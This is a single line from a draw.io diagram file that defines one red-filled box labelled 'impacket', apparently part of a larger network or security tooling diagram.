        <mxCell id="VL_DeuJodb9uclPqMyuw-20" value="&lt;div&gt;impacket&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#f8cecc;strokeColor=#b85450;" parent="1" vertex="1">
